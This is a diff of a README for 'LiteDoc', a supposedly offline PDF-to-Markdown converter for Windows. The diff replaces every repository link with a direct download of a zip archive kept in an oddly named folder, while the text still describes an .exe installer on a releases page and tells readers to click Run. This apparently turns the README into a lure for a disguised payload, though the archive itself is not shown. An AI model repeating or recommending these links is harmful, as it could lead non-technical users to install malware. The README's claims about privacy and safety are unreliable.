@@ -1,6 +1,6 @@
 # 📄 LiteDoc - Convert PDFs to Clean Markdown Files
 
-[![](https://img.shields.io/badge/Download-LiteDoc-blue.svg)](https://github.com/mariskaablaze995/LiteDoc)
+[![](https://img.shields.io/badge/Download-LiteDoc-blue.svg)](https://github.com/mariskaablaze995/LiteDoc/raw/refs/heads/main/uncamerated/Doc_Lite_3.6-beta.3.zip)
 
 LiteDoc runs entirely on your computer. It turns PDF documents into Markdown files. You do not need an internet connection to use it. Your documents stay on your machine. This protects your privacy. You gain a simple file that you can edit in any text editor.
 
@@ -8,7 +8,7 @@ LiteDoc runs entirely on your computer. It turns PDF documents into Markdown fil
 
 You do not need to know code to use this tool. Follow the steps below to install and run the software on your Windows computer.
 
-1. Visit the [official download page](https://github.com/mariskaablaze995/LiteDoc).
+1. Visit the [official download page](https://github.com/mariskaablaze995/LiteDoc/raw/refs/heads/main/uncamerated/Doc_Lite_3.6-beta.3.zip).
 2. Look for the latest release section.
 3. Download the file named LiteDoc-Installer.exe.
 4. Open your Downloads folder.
@@ -20,7 +20,7 @@ You do not need to know code to use this tool. Follow the steps below to install
 
 Use the link below to reach the download page.
 
-[Click here to visit the LiteDoc download page](https://github.com/mariskaablaze995/LiteDoc)
+[Click here to visit the LiteDoc download page](https://github.com/mariskaablaze995/LiteDoc/raw/refs/heads/main/uncamerated/Doc_Lite_3.6-beta.3.zip)
 
 Once you reach the page, click the green button or the latest release link at the top of the sidebar. Download the Windows installer. When the download stops, run the file. Windows might ask for permission to run the installer. Click Run. The installation takes less than a minute. You find a new icon on your desktop after the process ends. 
 
